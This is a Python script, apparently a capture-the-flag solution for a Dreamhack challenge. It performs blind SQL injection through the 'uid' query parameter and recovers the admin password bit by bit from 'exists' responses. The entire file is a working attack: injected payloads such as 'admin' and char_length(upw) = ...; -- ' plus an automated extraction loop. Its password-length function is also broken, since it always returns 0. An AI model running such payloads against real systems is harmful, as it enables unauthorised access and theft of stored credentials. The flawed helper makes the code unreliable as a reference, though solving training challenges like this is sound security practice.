import requests
from tqdm import tqdm

url = 'http://host3.dreamhack.games:10523/'

# Get Password Length
def pw_length():
    pw_length = 0

    for i in tqdm(range(100)):
        payload = f'admin\' and char_length(upw) = {i}; -- '
        param = {'uid' : payload}
        r = requests.get(url, params = param)
        
        if r.text.__contains__('exists'):
            break

    print(f'[*] PASSWORD LENGTH = {pw_length}')  
    return pw_length

def bitstream(pw_len):
    password = ""
    for i in range(1, pw_len + 1):
        bit_length = 0
        while True:
            bit_length += 1
            payload = f'admin\' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}; -- '
            param = {'uid' : payload}
            r = requests.get(url, params = param)
            
            if r.text.__contains__('exists'):
                break

        print(f'[*] {i}\'s BIT LENGTH = {bit_length}, ', end = '')

        bit = ""
        for j in range(1, bit_length + 1):    
            payloads = f'admin\' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = \'1\'; -- '
            param = {'uid' : payloads}
            r = requests.get(url, params = param)
            
            if r.text.__contains__('exists'):
                bit += '1'
            else:
                bit += '0'

        print(f'BIT = {bit}')

        password += int.to_bytes(int(bit, 2), (bit_length + 7) // 8, "big").decode("utf-8")

        print(f'[*] PASSWORD = {password}')

if __name__ == '__main__':
    # pw_len = pw_length()
    bitstream(13)
